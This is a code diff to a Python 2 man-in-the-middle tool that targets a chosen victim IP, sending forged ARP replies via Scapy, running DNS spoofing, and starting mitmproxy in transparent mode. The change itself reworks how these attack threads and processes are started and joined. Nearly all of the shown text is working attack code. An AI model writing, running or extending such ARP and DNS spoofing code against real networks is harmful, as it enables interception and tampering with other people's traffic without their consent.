@@ -14,6 +14,8 @@ import logging
 
 exit = False
 
+threads = []
+
 def parse_args():
     parser = argparse.ArgumentParser()
     parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
@@ -44,14 +46,16 @@ def spoof(localMac,victims,gateway):
         arp = ARP(op=op,psrc=gateway,pdst=victim,hwdst=localMac)
         arps.append(arp)
     def run():
+        j = 0
         while not exit:
             for arp in arps:
+                j+=1
                 if exit:
                     break
                 send(arp)
             time.sleep(1)
     t1 = threading.Thread(target=run)
-    t1.start()
+    threads.append(t1)
     #t1.join()
 
 queues = []
@@ -99,7 +103,7 @@ def dns_setup(dns, localIp):
         queue.try_run()
         print "Dns spoof stopped"
     p = Process(target=run)
-    p.start()
+    threads.append(p)
 
 def main(args):
     if os.geteuid() != 0:
@@ -156,14 +160,24 @@ def main(args):
         
     if args.proxy:
         if need_proxy:
-            os.system("mitmproxy -T --host --anticache --stream 10m")
+            def run():
+                os.system("mitmproxy -T --host --anticache --stream 10m")
+                print "Dns spoof stopped"
+            p = Process(target=run)
+            threads.append(p)
         else:
             print "Proxy started but not needed"
     else:
         if need_proxy:
             print "you will need to start your proxy manually"
     spoof(localMac, victims, gateway)
-    
+    try:
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+    except KeyboardInterrupt:
+        print "stop"
     clean()
 
 main(parse_args())
